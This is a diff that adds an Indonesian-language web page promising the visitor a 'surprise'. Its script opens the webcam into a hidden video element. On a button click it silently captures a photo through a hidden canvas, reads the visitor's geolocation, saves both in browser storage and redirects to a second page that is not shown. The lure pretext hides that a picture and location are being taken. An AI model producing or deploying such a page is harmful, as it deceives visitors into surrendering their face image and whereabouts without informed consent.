@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #ff5f6d, #ffc371);
+            font-family: 'Arial', sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            overflow: hidden;
+        }
+        .container {
+            position: relative;
+            z-index: 1;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin: 0;
+            animation: fadeIn 3s ease-in-out;
+        }
+        p {
+            font-size: 1.5em;
+            margin: 20px 0;
+            animation: fadeIn 3s ease-in-out 1s;
+        }
+        button {
+            font-size: 1.2em;
+            padding: 10px 20px;
+            background: #fff;
+            color: #ff5f6d;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            animation: pulse 1.5s infinite;
+        }
+        .gif {
+            width: 150px;
+            margin: 20px auto;
+        }
+        video, canvas {
+            display: none;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Selamat Datang!</h1>
+        <p>Saya mempunyai Kejutan buat kamu.</p>
+        <button id="selfieButton">Klik Disini</button>
+        <video id="video" width="640" height="480" autoplay></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+        const selfieButton = document.getElementById('selfieButton');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Akses kamera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+            })
+            .catch(error => {
+                console.error('Error accessing the camera:', error);
+            });
+
+        // Ambil foto dan simpan di localStorage, serta ambil lokasi
+        selfieButton.addEventListener('click', () => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+            localStorage.setItem('selfieImage', dataURL);
+
+            // Ambil lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    localStorage.setItem('userLocation', JSON.stringify({ latitude, longitude }));
+
+                    // Arahkan ke halaman kedua
+                    window.location.href = 'display.html';
+                }, error => {
+                    console.error('Error getting location:', error);
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
+        });
+    </script>
+</body>
+</html>
